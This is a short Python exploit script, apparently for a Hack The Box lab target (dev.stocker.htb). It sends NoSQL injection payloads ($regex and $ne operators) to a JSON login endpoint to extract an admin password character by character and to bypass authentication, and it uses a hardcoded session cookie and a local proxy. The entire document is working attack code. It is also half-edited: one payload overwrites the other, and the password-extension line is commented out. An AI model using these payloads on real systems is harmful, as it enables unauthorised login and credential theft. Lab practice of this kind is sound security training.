import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://dev.stocker.htb/login"
headers={'content-type': 'application/json'}
cookie={"connect.sid" : "s:CwrIaLv_AeBvIBkUYuzT6WZXB7GMCOuc.SwKSnXYQ0IaSSNvJcDCX%2BRIlGMqVqksISJRzmDnXJhM"}
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}
while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            payload='{"username": {"$ne": "%s"}, "password": {"$ne": "%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, cookies = cookie, verify = False, allow_redirects = False, proxies=proxies)
            print("trying %s"% c)
            if 'error=login-error' not in r.text:
                print(r.text)
                print("Found one more char : %s" % (password+c))
                #password += c